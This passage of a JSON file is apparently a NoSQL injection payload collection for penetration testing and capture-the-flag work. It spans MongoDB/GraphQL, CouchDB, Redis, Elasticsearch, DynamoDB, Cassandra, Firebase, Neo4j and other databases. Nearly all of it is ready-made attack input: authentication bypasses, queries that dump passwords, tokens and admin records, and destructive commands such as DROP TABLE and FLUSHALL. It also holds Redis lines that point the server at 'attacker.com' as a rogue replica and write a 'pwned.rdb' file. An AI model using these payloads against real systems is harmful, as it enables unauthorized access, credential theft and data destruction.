    "description": "GraphQL variable injection into MongoDB filters",
    "query_payloads": [
      {
        "query": "query { users(filter: {\"$ne\": {}}) { _id email } }"
      },
      {
        "query": "query { users(filter: {\"username\": {\"$ne\": null}}) { _id email token } }"
      },
      {
        "query": "query { users(filter: {\"password\": {\"$regex\": \".*\"}}) { _id email password } }"
      },
      {
        "query": "query { login(username: {\"$ne\": \"\"}, password: {\"$ne\": \"\"}) { token } }"
      },
      {
        "query": "query { users(filter: {\"role\": {\"$in\": [\"admin\",\"superadmin\"]}}) { _id email role } }"
      },
      {
        "query": "query { users(filter: {\"$where\": \"1==1\"}) { _id email password } }"
      },
      {
        "query": "query { users(where: {password: {_regex: \".*\"}}) { id email } }"
      },
      {
        "query": "{ user(id: {$gt: \"\"}) { email password token } }"
      },
      {
        "query": "query { getUser(username: {$ne: \"\"}) { id email role password } }"
      },
      {
        "query": "query { allUsers(condition: {role: {in: [\"admin\", \"superadmin\"]}}) { nodes { id email password } } }"
      },
      {
        "query": "mutation { login(input: {username: {$ne: \"\"}, password: {$ne: \"\"}}) { token user { role } } }"
      },
      {
        "query": "query { search(query: {$where: \"1==1\"}) { id title content } }"
      }
    ],
    "variable_payloads": [
      {
        "f": {
          "$ne": {}
        }
      },
      {
        "f": {
          "username": {
            "$ne": null
          },
          "password": {
            "$ne": null
          }
        }
      },
      {
        "filter": {
          "$where": "1==1"
        }
      },
      {
        "filter": {
          "password": {
            "$regex": ".*"
          }
        }
      },
      {
        "filter": {
          "role": {
            "$in": [
              "admin",
              "superadmin"
            ]
          }
        }
      },
      {
        "filter": {
          "$or": [
            {
              "role": "admin"
            },
            {
              "isAdmin": true
            }
          ]
        }
      },
      {
        "filter": {
          "_id": {
            "$exists": true
          },
          "role": {
            "$ne": "user"
          }
        }
      },
      {
        "filter": {
          "username": {
            "$gt": ""
          }
        }
      },
      {
        "where": {
          "username": {
            "_nin": [
              "guest"
            ]
          },
          "password": {
            "_gt": ""
          }
        }
      },
      {
        "condition": {
          "role": {
            "_eq": "admin"
          },
          "password": {
            "_neq": ""
          }
        }
      },
      {
        "input": {
          "username": {
            "$ne": ""
          },
          "password": {
            "$ne": ""
          }
        }
      },
      {
        "args": {
          "filter": {
            "$ne": null
          }
        }
      }
    ]
  },
  "couchdb_injection": {
    "description": "CouchDB-specific NoSQL injection payloads",
    "endpoint_fuzzing": [
      "/_utils/",
      "/_all_dbs",
      "/_replicator",
      "/_users",
      "/_users/_all_docs",
      "/_users/_changes",
      "/_config",
      "/_session",
      "/_stats",
      "/_active_tasks",
      "/_scheduler/jobs",
      "/_node/nonode@nohost/_config",
      "/_node/nonode@nohost/_config/admins",
      "/_cluster_setup",
      "/{db}/_all_docs",
      "/{db}/_changes",
      "/{db}/_security",
      "/{db}/_design/{ddoc}/_view/{view}?key=null&include_docs=true",
      "/{db}/_find",
      "/{db}/_index",
      "/{db}/_explain"
    ],
    "mango_query_bypass": [
      {
        "selector": {}
      },
      {
        "selector": {
          "_id": {
            "$gt": null
          }
        }
      },
      {
        "selector": {
          "$or": [
            {
              "_id": {
                "$gt": null
              }
            }
          ]
        }
      },
      {
        "selector": {
          "type": "user"
        }
      },
      {
        "selector": {
          "name": {
            "$regex": ".*"
          }
        }
      },
      {
        "selector": {
          "name": {
            "$ne": null
          },
          "password": {
            "$ne": null
          }
        }
      },
      {
        "selector": {
          "name": {
            "$in": [
              "admin",
              "root",
              "_admin"
            ]
          }
        }
      },
      {
        "selector": {
          "roles": {
            "$elemMatch": "$eq"
          }
        }
      },
      {
        "selector": {
          "roles": {
            "$in": [
              "_admin",
              "admin"
            ]
          }
        }
      },
      {
        "selector": {
          "$and": [
            {
              "name": {
                "$ne": ""
              }
            },
            {
              "password_scheme": {
                "$exists": true
              }
            }
          ]
        }
      },
      {
        "selector": {
          "name": {
            "$gt": ""
          }
        }
      },
      {
        "selector": {
          "name": {
            "$exists": true
          }
        }
      },
      {
        "selector": {
          "type": {
            "$in": [
              "user",
              "admin"
            ]
          }
        }
      },
      {
        "selector": {
          "derived_key": {
            "$exists": true
          }
        }
      },
      {
        "selector": {
          "salt": {
            "$exists": true
          }
        }
      },
      {
        "limit": 100,
        "selector": {}
      },
      {
        "limit": 1000,
        "selector": {},
        "fields": [
          "_id",
          "name",
          "roles",
          "password_sha",
          "salt"
        ]
      },
      {
        "limit": 100,
        "selector": {
          "name": {
            "$ne": ""
          }
        },
        "fields": [
          "_id",
          "name",
          "roles"
        ]
      }
    ],
    "view_injection": [
      "/{db}/_design/auth/_view/users?key=null",
      "/{db}/_design/auth/_view/users?startkey=null&endkey={}",
      "/{db}/_design/app/_view/by_type?key=\"user\"&include_docs=true",
      "/{db}/_design/app/_view/by_role?key=\"admin\"&include_docs=true"
    ]
  },
  "redis_injection": {
    "description": "Redis-specific injection payloads",
    "raw_commands": [
      "KEYS *",
      "KEYS admin*",
      "KEYS user:*",
      "KEYS session:*",
      "KEYS flag*",
      "KEYS secret*",
      "KEYS token:*",
      "KEYS *:password",
      "KEYS *:token",
      "KEYS *:secret",
      "GET admin",
      "GET flag",
      "GET secret",
      "GET token",
      "GET password",
      "HGETALL users",
      "HGETALL admin",
      "HGETALL config",
      "HGETALL session",
      "SMEMBERS admins",
      "SMEMBERS users",
      "SMEMBERS roles",
      "LRANGE users 0 -1",
      "LRANGE sessions 0 -1",
      "CONFIG GET *",
      "CONFIG GET requirepass",
      "CONFIG GET bind",
      "CONFIG GET dir",
      "CONFIG GET dbfilename",
      "CONFIG SET dir /tmp",
      "CONFIG SET dbfilename pwned.rdb",
      "CONFIG SET requirepass \"\"",
      "SAVE",
      "DEBUG OBJECT key",
      "DEBUG SLEEP 5",
      "SLAVEOF attacker.com 6379",
      "REPLICAOF attacker.com 6379",
      "FLUSHALL",
      "FLUSHDB",
      "DBSIZE",
      "INFO",
      "INFO server",
      "INFO keyspace",
      "INFO all",
      "SELECT 0",
      "SELECT 1",
      "SELECT 2",
      "SCAN 0",
      "SCAN 0 MATCH *",
      "SCAN 0 MATCH flag*",
      "SCAN 0 COUNT 100",
      "TYPE flag",
      "TYPE admin",
      "TTL flag",
      "PERSIST flag",
      "DUMP flag",
      "OBJECT ENCODING flag",
      "OBJECT HELP"
    ],
    "eval_payloads": [
      "EVAL \"return redis.call('keys','*')\" 0",
      "EVAL \"local a=redis.call('get',KEYS[1]); return a\" 1 flag",
      "EVAL \"return redis.call('hgetall','users')\" 0",
      "EVAL \"return redis.call('smembers','admins')\" 0",
      "EVAL \"return redis.call('config','get','*')\" 0",
      "EVAL \"return redis.call('info')\" 0",
      "EVAL \"return redis.call('dbsize')\" 0",
      "EVAL \"local k=redis.call('keys','*'); return k\" 0",
      "EVAL \"return redis.call('get','flag')\" 0",
      "EVAL \"return redis.call('get','secret')\" 0",
      "EVAL \"return redis.call('lrange','users',0,-1)\" 0"
    ],
    "ssji_via_eval": [
      "\r\nKEYS *\r\n",
      "\r\nGET flag\r\n",
      "*3\r\n$3\r\nGET\r\n$4\r\nflag\r\n",
      "MULTI\r\nKEYS *\r\nEXEC\r\n",
      "\r\nCONFIG SET dir /tmp\r\nCONFIG SET dbfilename pwned.rdb\r\nSAVE\r\n",
      "\r\nSLAVEOF attacker.com 6379\r\n",
      "PING\r\nKEYS *\r\n",
      "KEYS *\r\nGET admin\r\nGET flag\r\n"
    ]
  },
  "elasticsearch_injection": {
    "description": "Elasticsearch query injection payloads",
    "query_payloads": [
      {
        "query": {
          "match_all": {}
        }
      },
      {
        "query": {
          "match": {
            "_id": "*"
          }
        }
      },
      {
        "query": {
          "wildcard": {
            "username": {
              "value": "*"
            }
          }
        }
      },
      {
        "query": {
          "wildcard": {
            "password": {
              "value": "*"
            }
          }
        }
      },
      {
        "query": {
          "regexp": {
            "username": ".*"
          }
        }
      },
      {
        "query": {
          "regexp": {
            "password": ".*"
          }
        }
      },
      {
        "query": {
          "range": {
            "age": {
              "gte": 0
            }
          }
        }
      },
      {
        "query": {
          "bool": {
            "must": [
              {
                "match_all": {}
              }
            ]
          }
        }
      },
      {
        "query": {
          "bool": {
            "should": [
              {
                "match": {
                  "role": "admin"
                }
              },
              {
                "match": {
                  "isAdmin": true
                }
              }
            ]
          }
        }
      },
      {
        "query": {
          "exists": {
            "field": "password"
          }
        }
      },
      {
        "query": {
          "exists": {
            "field": "token"
          }
        }
      },
      {
        "query": {
          "exists": {
            "field": "apiKey"
          }
        }
      },
      {
        "query": {
          "terms": {
            "username": [
              "admin",
              "root",
              "administrator"
            ]
          }
        }
      },
      {
        "query": {
          "terms": {
            "role": [
              "admin",
              "superadmin",
              "root"
            ]
          }
        }
      },
      {
        "query": {
          "script": {
            "script": {
              "source": "doc['role'].value == 'admin'"
            }
          }
        }
      },
      {
        "query": {
          "script": {
            "script": {
              "source": "true"
            }
          }
        }
      },
      {
        "query": {
          "script": {
            "script": {
              "source": "doc['password'].size() > 0"
            }
          }
        }
      },
      {
        "query": {
          "query_string": {
            "query": "* OR role:admin"
          }
        }
      },
      {
        "query": {
          "query_string": {
            "query": "username:admin OR 1=1"
          }
        }
      },
      {
        "query": {
          "query_string": {
            "query": "_id:* AND password:*"
          }
        }
      },
      {
        "query": {
          "query_string": {
            "query": "*"
          }
        }
      },
      {
        "query": {
          "query_string": {
            "query": "role:admin"
          }
        }
      },
      {
        "query": {
          "query_string": {
            "query": "isAdmin:true"
          }
        }
      },
      {
        "from": 0,
        "size": 10000,
        "query": {
          "match_all": {}
        }
      },
      {
        "from": 0,
        "size": 1000,
        "query": {
          "exists": {
            "field": "password"
          }
        },
        "_source": [
          "username",
          "password",
          "email",
          "role",
          "token"
        ]
      }
    ],
    "aggregation_payloads": [
      {
        "aggs": {
          "all_users": {
            "terms": {
              "field": "username.keyword",
              "size": 1000
            }
          }
        }
      },
      {
        "aggs": {
          "roles": {
            "terms": {
              "field": "role.keyword",
              "size": 100
            }
          }
        }
      },
      {
        "aggs": {
          "passwords": {
            "terms": {
              "field": "password.keyword",
              "size": 1000
            }
          }
        }
      },
      {
        "aggs": {
          "emails": {
            "terms": {
              "field": "email.keyword",
              "size": 1000
            }
          }
        }
      }
    ],
    "url_encoded": [
      "q=*&size=100",
      "q=username:admin",
      "q=role:admin",
      "q=*:*",
      "q=password:*&fields=username,password,email",
      "q=isAdmin:true",
      "q=role:(admin+OR+superadmin)",
      "q=_exists_:password",
      "q=_exists_:token",
      "search=*&type=user",
      "q=username:admin+AND+_exists_:password"
    ]
  },
  "dynamodb_injection": {
    "description": "AWS DynamoDB injection via FilterExpression and condition manipulation",
    "filter_expression_payloads": [
      {
        "FilterExpression": "attribute_exists(#pk)",
        "ExpressionAttributeNames": {
          "#pk": "_id"
        }
      },
      {
        "FilterExpression": "username = :u OR :u = :u",
        "ExpressionAttributeValues": {
          ":u": {
            "S": "admin"
          }
        }
      },
      {
        "FilterExpression": ":u = :u",
        "ExpressionAttributeValues": {
          ":u": {
            "S": "1"
          }
        }
      },
      {
        "FilterExpression": "attribute_exists(password)"
      },
      {
        "FilterExpression": "begins_with(username, :u)",
        "ExpressionAttributeValues": {
          ":u": {
            "S": "a"
          }
        }
      },
      {
        "FilterExpression": "contains(roles, :r)",
        "ExpressionAttributeValues": {
          ":r": {
            "S": "admin"
          }
        }
      },
      {
        "FilterExpression": "size(password) > :n",
        "ExpressionAttributeValues": {
          ":n": {
            "N": "0"
          }
        }
      },
      {
        "FilterExpression": "attribute_type(password, :t)",
        "ExpressionAttributeValues": {
          ":t": {
            "S": "S"
          }
        }
      },
      {
        "FilterExpression": "NOT attribute_not_exists(password)"
      },
      {
        "FilterExpression": "attribute_exists(#r)",
        "ExpressionAttributeNames": {
          "#r": "role"
        }
      },
      {
        "FilterExpression": "#r = :admin",
        "ExpressionAttributeNames": {
          "#r": "role"
        },
        "ExpressionAttributeValues": {
          ":admin": {
            "S": "admin"
          }
        }
      },
      {
        "FilterExpression": "isAdmin = :t",
        "ExpressionAttributeValues": {
          ":t": {
            "BOOL": true
          }
        }
      }
    ],
    "scan_filter_payloads": [
      {
        "ScanFilter": {
          "username": {
            "AttributeValueList": [
              {
                "S": "admin"
              }
            ],
            "ComparisonOperator": "BEGINS_WITH"
          }
        }
      },
      {
        "ScanFilter": {
          "password": {
            "AttributeValueList": [],
            "ComparisonOperator": "NOT_NULL"
          }
        }
      },
      {
        "ScanFilter": {
          "isAdmin": {
            "AttributeValueList": [
              {
                "BOOL": true
              }
            ],
            "ComparisonOperator": "EQ"
          }
        }
      },
      {
        "ScanFilter": {
          "role": {
            "AttributeValueList": [
              {
                "S": "admin"
              },
              {
                "S": "superadmin"
              }
            ],
            "ComparisonOperator": "IN"
          }
        }
      },
      {
        "ScanFilter": {
          "username": {
            "AttributeValueList": [],
            "ComparisonOperator": "NOT_NULL"
          },
          "password": {
            "AttributeValueList": [],
            "ComparisonOperator": "NOT_NULL"
          }
        }
      },
      {
        "ScanFilter": {
          "level": {
            "AttributeValueList": [
              {
                "N": "5"
              }
            ],
            "ComparisonOperator": "GT"
          }
        }
      }
    ],
    "key_condition_payloads": [
      {
        "KeyConditionExpression": "pk = :pk",
        "FilterExpression": "attribute_exists(adminFlag)",
        "ExpressionAttributeValues": {
          ":pk": {
            "S": "user"
          }
        }
      },
      {
        "KeyConditionExpression": "pk = :pk AND begins_with(sk, :prefix)",
        "ExpressionAttributeValues": {
          ":pk": {
            "S": "admin"
          },
          ":prefix": {
            "S": "profile"
          }
        }
      },
      {
        "KeyConditionExpression": "pk = :pk",
        "FilterExpression": "isAdmin = :t",
        "ExpressionAttributeValues": {
          ":pk": {
            "S": "users"
          },
          ":t": {
            "BOOL": true
          }
        }
      }
    ]
  },
  "cassandra_cql_injection": {
    "description": "Apache Cassandra CQL injection payloads",
    "basic_auth_bypass": [
      "' OR '1'='1",
      "' OR 1=1--",
      "admin'--",
      "admin' ALLOW FILTERING--",
      "'; SELECT * FROM users; --",
      "' OR username IN ('admin','root')--",
      "' OR token(username) > token('')--",
      "' OR role = 'admin'--",
      "admin' AND password > '' ALLOW FILTERING--",
      "' OR ttl(password) > 0 ALLOW FILTERING--",
      "' OR writetime(password) > 0 ALLOW FILTERING--",
      "admin'/*"
    ],
    "ddl_dml_injection": [
      "'; TRUNCATE users; --",
      "'; DROP TABLE users; --",
      "'; INSERT INTO users(username,password,role) VALUES ('hacker','hacked','admin'); --",
      "'; UPDATE users SET role='admin' WHERE username='attacker'; --",
      "'; DELETE FROM users WHERE username != 'attacker'; --",
      "'; CREATE TABLE pwned (id uuid PRIMARY KEY, data text); --"
    ],
    "token_function_bypass": [
      "' OR token(pk) >= token(minTimeuuid('2000-01-01 00:00:00+0000'))--",
      "' OR token(pk) < token(maxTimeuuid('2100-01-01 00:00:00+0000'))--",
      "' OR token(username) = token('admin')--"
    ]
  },
  "firebase_realtime_injection": {
    "description": "Firebase Realtime Database REST API injection",
    "rest_api_payloads": [
      "/.json",
      "/users.json",
      "/admin.json",
      "/config.json",
      "/secrets.json",
      "/flags.json",
      "/credentials.json",
      "/api_keys.json",
      "/private.json",
      "/users.json?auth=FIREBASE_SECRET",
      "/users.json?orderBy=\"role\"&equalTo=\"admin\"",
      "/users.json?orderBy=\"isAdmin\"&equalTo=true",
      "/users.json?orderBy=\"level\"&startAt=9",
      "/users.json?orderBy=\"$key\"&limitToFirst=100",
      "/users.json?orderBy=\"email\"&startAt=\"a\"",
      "/users.json?shallow=true",
      "/.settings/rules.json",
      "/.info/connected.json",
      "/.info/serverTimeOffset.json"
    ],
    "rules_bypass": [
      "GET /.json - public read if rules misconfigured",
      "GET /users.json?auth=INVALID - unauthenticated access test",
      "GET /admin.json - admin node public read test",
      "PUT /users/newadmin.json {\"role\":\"admin\"} - unauthorized write test",
      "PATCH /users/victim.json {\"role\":\"admin\"} - escalation test"
    ]
  },
  "firestore_injection": {
    "description": "Google Cloud Firestore injection via REST API and client SDK",
    "rest_api_payloads": [
      {
        "structuredQuery": {
          "from": [
            {
              "collectionId": "users"
            }
          ],
          "where": {
            "fieldFilter": {
              "field": {
                "fieldPath": "role"
              },
              "op": "EQUAL",
              "value": {
                "stringValue": "admin"
              }
            }
          }
        }
      },
      {
        "structuredQuery": {
          "from": [
            {
              "collectionId": "users"
            }
          ],
          "where": {
            "fieldFilter": {
              "field": {
                "fieldPath": "isAdmin"
              },
              "op": "EQUAL",
              "value": {
                "booleanValue": true
              }
            }
          }
        }
      },
      {
        "structuredQuery": {
          "from": [
            {
              "collectionId": "users"
            }
          ]
        }
      },
      {
        "structuredQuery": {
          "from": [
            {
              "allDescendants": true,
              "collectionId": "users"
            }
          ]
        }
      },
      {
        "structuredQuery": {
          "from": [
            {
              "collectionId": "secrets"
            }
          ]
        }
      },
      {
        "structuredQuery": {
          "from": [
            {
              "collectionId": "flags"
            }
          ]
        }
      }
    ],
    "sdk_bypass_patterns": [
      ".where('role', '==', 'admin').get()",
      ".where('isAdmin', '==', true).get()",
      ".where('level', '>', 5).get()",
      ".where('username', '!=', 'guest').get()",
      ".where('password', '!=', null).get()",
      ".orderBy('_id').startAt(0).limit(1000).get()"
    ],
    "rules_bypass_patterns": [
      "match /users/{userId} { allow read: if true; }",
      "match /admin/{document} { allow read, write: if true; }",
      "match /{document=**} { allow read, write: if true; }"
    ]
  },
  "couchbase_injection": {
    "description": "Couchbase N1QL injection payloads",
    "n1ql_payloads": [
      "' OR '1'='1",
      "' OR 1=1--",
      "admin'--",
      "'; SELECT * FROM `users`;--",
      "' OR username IS NOT MISSING--",
      "' OR type = 'user'--",
      "' OR role = 'admin'--",
      "' OR isAdmin = true--",
      "'; SELECT meta().id, * FROM `users` LIMIT 1000;--",
      "'; SELECT password FROM `users` WHERE username = 'admin';--",
      "' UNION SELECT * FROM `users`--",
      "' UNION SELECT username, password FROM `users` LIMIT 100--",
      "' OR password IS NOT MISSING--",
      "' OR token IS NOT MISSING--",
      "'; INSERT INTO `users` (username, password, role) VALUES ('hacker', 'hacked', 'admin');--",
      "'; UPDATE `users` SET role = 'admin' WHERE username = 'attacker';--"
    ],
    "rest_api_payloads": [
      "/query/service?statement=SELECT+*+FROM+users",
      "/query/service?statement=SELECT+*+FROM+users+WHERE+username+IS+NOT+MISSING",
      "/query/service?statement=SELECT+*+FROM+users+WHERE+role='admin'",
      "/pools/default/buckets",
      "/settings/web",
      "/admin/logs"
    ]
  },
  "arangodb_injection": {
    "description": "ArangoDB AQL injection payloads",
    "aql_payloads": [
      "' OR 1==1",
      "' OR true",
      "' RETURN true",
      "' RETURN {}",
      "admin'//",
      "'; RETURN DOCUMENT('users', 'admin');//",
      "'; FOR u IN users RETURN u;//",
      "'; FOR u IN users FILTER u.role == 'admin' RETURN u;//",
      "' OR u.isAdmin == true",
      "'; FOR c IN _collections RETURN c.name;//",
      "'; RETURN COLLECTIONS();//",
      "' OR LENGTH(u.password) > 0",
      "'; FOR u IN users FILTER u.username != '' RETURN {username: u.username, password: u.password};//",
      "'; FOR u IN users SORT u._key LIMIT 1000 RETURN u;//",
      "' FILTER 1==1 RETURN",
      "' FILTER true RETURN"
    ],
    "http_api_payloads": [
      {
        "query": "FOR u IN users RETURN u"
      },
      {
        "query": "FOR u IN users FILTER u.role == 'admin' RETURN u"
      },
      {
        "query": "FOR u IN users FILTER u.isAdmin == true RETURN u"
      },
      {
        "query": "FOR u IN users FILTER u.username != '' RETURN {username: u.username, password: u.password, token: u.token}"
      },
      {
        "query": "RETURN COLLECTIONS()"
      },
      {
        "query": "RETURN VERSION()"
      },
      {
        "query": "FOR u IN users LIMIT 1000 RETURN u"
      },
      {
        "query": "FOR u IN users FILTER u.level > 5 RETURN u"
      }
    ]
  },
  "neo4j_cypher_injection": {
    "description": "Neo4j Cypher query injection payloads",
    "cypher_payloads": [
      "' OR '1'='1",
      "' OR 1=1--",
      "admin' OR '1'='1",
      "' RETURN true--",
      "' RETURN 1--",
      "'; MATCH (n) RETURN n;--",
      "'; MATCH (u:User) RETURN u;--",
      "'; MATCH (u:User) WHERE u.role='admin' RETURN u;--",
      "'; MATCH (u:User) RETURN u.username, u.password;--",
      "'; CALL dbms.procedures() YIELD name RETURN name;--",
      "'; CALL dbms.components() YIELD name, versions RETURN name, versions;--",
      "'; CALL db.labels() YIELD label RETURN label;--",
      "'; CALL db.relationshipTypes() YIELD relationshipType RETURN relationshipType;--",
      "'; CALL db.propertyKeys() YIELD propertyKey RETURN propertyKey;--",
      "' OR u.isAdmin=true--",
      "' OR u.level>5--",
      "admin') OR ('1'='1",
      "' OR exists(u.password)--",
      "'; MATCH (u:User) DELETE u;--",
      "'; MATCH (u:User) SET u.role='admin';--"
    ]
  },
  "hbase_injection": {
    "description": "Apache HBase REST API and Thrift injection",
    "rest_api_payloads": [
      "/",
      "/version",
      "/status/cluster",
      "/{table}/schema",
      "/{table}/*/",
      "/{table}/*",
      "/{table}/scanner",
      "/{table}/scanner/ (POST with filter)",
      "users/schema",
      "users/*/",
      "admin/*/",
      "flags/*/",
      "secrets/*/"
    ],
    "scanner_filter_payloads": [
      "<Scanner batch=\"100\"><filter>{\"type\": \"RowFilter\", \"op\": \"EQUAL\", \"comparator\": {\"type\": \"RegexStringComparator\", \"value\": \".*\"}}</filter></Scanner>",
      "<Scanner batch=\"100\"><filter>{\"type\": \"ValueFilter\", \"op\": \"EQUAL\", \"comparator\": {\"type\": \"RegexStringComparator\", \"value\": \".*\"}}</filter></Scanner>",
      "<Scanner batch=\"1000\"></Scanner>",
      "<Scanner batch=\"100\"><filter>{\"type\": \"PrefixFilter\", \"value\": \"admin\"}</filter></Scanner>"
    ]
  },
  "influxdb_injection": {
    "description": "InfluxDB Flux and InfluxQL injection",
    "influxql_payloads": [
      "' OR '1'='1",
      "' OR 1=1--",
      "'; SHOW DATABASES;--",
      "'; SHOW MEASUREMENTS;--",
      "'; SHOW SERIES;--",
      "'; SELECT * FROM measurements;--",
      "'; DROP MEASUREMENT users;--",
      "' OR value > 0--",
      "' OR time > 0--"
    ],
    "flux_payloads": [
      "0|> filter(fn: (r) => true)",
      "0|> filter(fn: (r) => r._value != \"\")",
      "from(bucket:\"db\") |> range(start: 0) |> filter(fn: (r) => true)",
      "from(bucket:\"users\") |> range(start: 0) |> limit(n:1000)"
    ]
  },
  "faunadb_injection": {
    "description": "FaunaDB FQL injection patterns",
    "fql_payloads": [
      {
        "lambda": "_ => true"
      },
      {
        "map": [
          {
            "lambda": "_ => true"
          },
          {
            "paginate": {
              "match": {
                "index": "all_users"
              }
            }
          }
        ]
      },
      {
        "get": {
          "ref": {
            "collection": "users"
          }
        }
      },
      {
        "paginate": {
          "match": {
            "index": "all_users"
          }
        }
      },
      {
        "filter": [
          {
            "lambda": "x => true"
          },
          {
            "paginate": {
              "match": {
                "index": "all_users"
              }
            }
          }
        ]
      },
      {
        "map": [
          {
            "lambda": "x => x"
          },
          {
            "paginate": {
              "match": {
                "index": "users_by_role"
              },
              "terms": "admin"
            }
          }
        ]
      },
      {
        "get": {
          "var": "admin_ref"
        }
      },
      {
        "paginate": {
          "documents": {
            "collection": "users"
          }
        }
      }
    ]
  },
  "ravendb_injection": {
    "description": "RavenDB RQL injection payloads",
    "rql_payloads": [
      "' OR 1=1",
      "' OR '1'='1",
      "admin'--",
      "'; FROM Users SELECT *;--",
      "'; FROM Users WHERE IsAdmin = true SELECT *;--",
      "' OR IsAdmin = true--",
      "' OR Role = 'admin'--",
      "'; FROM @all_docs SELECT *;--",
      "'; FROM Users SELECT Name, Password, Token LIMIT 1000;--",
      "' OR true--"
    ],
    "http_api_payloads": [
      "/databases/db/queries?query=FROM+Users+SELECT+*",
      "/databases/db/queries?query=FROM+Users+WHERE+Role='admin'+SELECT+*",
      "/databases/db/queries?query=FROM+@all_docs+SELECT+*",
      "/databases/db/collections/Users"
    ]
  },
  "orientdb_injection": {
    "description": "OrientDB SQL injection payloads",
    "sql_payloads": [
      "' OR 1=1--",
      "' OR '1'='1",
      "admin'--",
      "'; SELECT * FROM OUser;--",
      "'; SELECT * FROM OUser WHERE status='ACTIVE';--",
      "'; SELECT name, password FROM OUser;--",
      "' OR role = 'admin'--",
      "' OR @class = 'OUser'--",
      "'; SELECT * FROM V LIMIT 1000;--",
      "'; SELECT expand(in_Roles) FROM OUser;--",
      "'; TRAVERSE * FROM V MAXDEPTH 3;--"
    ]
  },
  "php_specific_nosql": {
    "description": "PHP-specific NoSQL injection vectors",
    "type_juggling_php": [
      "username=admin&password[]=",
      "username=admin&password[0]=",
      "username=admin&password[0][]=",
      "username[]=admin&password[]=pass",
      "username[0]=admin&password[0]=pass",
      "username[eq]=admin&password[ne]=x",
      "login[]=admin&pass[]=",
      "user=admin&pass[$ne]=x",
      "user=admin&pass[$gt]=",
      "user=admin&pass[$exists]=true",
      "user=admin&pass[$regex]=.*",
      "user[$ne]=x&pass[$ne]=x",
      "user[$eq]=admin&pass[$ne]=x",
      "login[$regex]=.*&password[$regex]=.*",
      "username[$in][]=admin&username[$in][]=root&password[$gt]="
    ],
    "serialize_injection": [
      "O:8:\"stdClass\":2:{s:8:\"username\";O:8:\"stdClass\":1:{s:3:\"$ne\";N;}s:8:\"password\";O:8:\"stdClass\":1:{s:3:\"$ne\";N;}}",
      "a:2:{s:8:\"username\";a:1:{s:3:\"$ne\";s:0:\"\";}s:8:\"password\";a:1:{s:3:\"$ne\";s:0:\"\";}}"
    ]
  },
  "http_header_injection": {
    "description": "NoSQL injection via HTTP headers",
    "payloads": [
      {
        "header": "X-User-ID",
        "value": "{\"$ne\": null}"
      },
      {
        "header": "X-User-ID",
        "value": "{\"$gt\": \"\"}"
      },
      {
        "header": "Authorization",
        "value": "Bearer {\"$ne\": null}"
      },
      {
        "header": "X-Username",
        "value": "{\"$regex\": \".*\"}"
      },
      {
        "header": "X-Auth-Token",
        "value": "{\"$ne\": \"invalid\"}"
      },
      {
        "header": "X-API-Key",
        "value": "{\"$exists\": true}"
      },
      {
        "header": "Cookie",
        "value": "user={\"$ne\":null}; session={\"$ne\":null}"
      },
      {
        "header": "X-Forwarded-For",
        "value": "' || 1==1 //"
      },
      {
        "header": "User-Agent",
        "value": "'; return true; //"
      },
      {
        "header": "Referer",
        "value": "' || this.password.match(/.*/) //"
      }
    ]
  },
  "json_parameter_pollution": {
    "description": "JSON parameter pollution and nesting attacks",
    "payloads": [
      {
        "username": {
          "username": {
            "$ne": null
          }
        },
        "password": {
          "$ne": null
        }
      },
      {
        "query": {
          "username": {
            "$ne": null
          },
          "password": {
            "$ne": null
          }
        }
      },
      {
        "filter": {
          "username": {
            "$ne": ""
          },
          "password": {
            "$ne": ""
          }
        }
      },
      {
        "where": {
          "username": {
            "$gt": ""
          },
          "password": {
            "$gt": ""
          }
        }
      },
      {
        "search": {
          "$ne": null
        }
      },
      {
        "input": {
          "$ne": null
        }
      },
      {
        "data": {
          "$ne": null
        }
      },
      {
        "body": {
          "username": {
            "$ne": ""
          },
          "password": {
            "$ne": ""
          }
        }
      },
      {
        "params": {
          "username": {
            "$ne": ""
          },
          "password": {
            "$ne": ""
          }
        }
      },
      {
        "args": {
          "username": {
            "$ne": ""
          },
          "password": {
            "$ne": ""
          }
        }
      },
      {
        "payload": {
          "username": {
            "$ne": ""
          },
          "password": {
            "$ne": ""
          }
        }
      },
      {
        "req": {
          "username": {
            "$ne": ""
          },
          "password": {
            "$ne": ""
          }
        }
      },
      {
        "condition": {
          "username": {
            "$ne": ""
          },
          "password": {
            "$ne": ""
          }
        }
      },
      {
        "criteria": {
          "username": {
            "$ne": ""
          },
          "password": {
            "$ne": ""
          }
        }
      },
      {
        "selector": {
          "username": {
            "$ne": ""
          },
          "password": {
            "$ne": ""
          }
        }
      }
    ]
  },
  "nosql_ssrf_pivot": {
    "description": "SSRF via NoSQL injection",
    "payloads": [
      [
        {
          "$lookup": {
            "from": "../../etc/passwd",
            "as": "r",
            "pipeline": []
          }
        }
      ],
      [
        {
          "$out": "/tmp/pwned"
        }
      ],
      [
        {
          "$merge": {
            "into": {
              "db": "admin",
              "coll": "system.users"
            },
            "on": "_id"
          }
        }
      ],
      [
        {
          "$currentOp": {
            "allUsers": true,
            "idleConnections": true
          }
        }
      ],
      [
        {
          "$listLocalSessions": {
            "allUsers": true
          }
        }
      ],
      [
        {
          "$listSessions": {
            "allUsers": true
          }
        }
      ],
      {
        "$function": {
          "body": "function(){return db.version();}",
          "args": [],
          "lang": "js"
        }
      },
      {
        "$function": {
          "body": "function(){return db.adminCommand({listDatabases:1}).databases.map(d=>d.name).join(',');}",
          "args": [],
          "lang": "js"
        }
      },
      {
        "$function": {
          "body": "function(){var x=db.runCommand({listCollections:1,authorizedCollections:true,nameOnly:true});return x.cursor.firstBatch.map(c=>c.name).join(',');}",
          "args": [],
          "lang": "js"
        }
      },
      {
        "$accumulator": {
          "init": "function(){return {};}",
          "accumulate": "function(s,v){return s;}",
          "accumulateArgs": [
            "$_id"
          ],
          "merge": "function(s1,s2){return s1;}",
          "finalize": "function(s){return db.version();}",
          "lang": "js"
        }
      }
    ]
  },
  "ctf_specific_payloads": {
    "description": "CTF-optimized payloads for flag extraction",
    "flag_field_probes": [
      {
        "$where": "typeof this.flag !== 'undefined'"
      },
      {
        "$where": "typeof this.FLAG !== 'undefined'"
      },
      {
        "$where": "typeof this.Flag !== 'undefined'"
      },
      {
        "$where": "typeof this.secret !== 'undefined'"
      },
      {
        "$where": "typeof this.Secret !== 'undefined'"
      },
      {
        "$where": "typeof this.SECRET !== 'undefined'"
      },
      {
        "$where": "typeof this.key !== 'undefined'"
      },
      {
        "$where": "typeof this.answer !== 'undefined'"
      },
      {
        "$where": "typeof this.solution !== 'undefined'"
      },
      {
        "$where": "typeof this.challenge !== 'undefined'"
      },
      {
        "flag": {
          "$exists": true
        }
      },
      {
        "flag": {
          "$ne": null
        }
      },
      {
